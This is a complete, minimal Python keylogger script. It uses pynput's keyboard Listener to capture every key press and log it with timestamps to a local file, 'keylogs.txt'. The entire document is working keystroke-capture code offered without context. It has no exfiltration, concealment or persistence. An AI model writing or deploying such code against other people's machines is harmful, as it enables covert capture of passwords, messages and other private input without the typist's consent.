from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename="keylogs.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def onKeyPress(key):
    logging.info(str(key))

with Listener(on_press=onKeyPress) as listener:
    listener.join()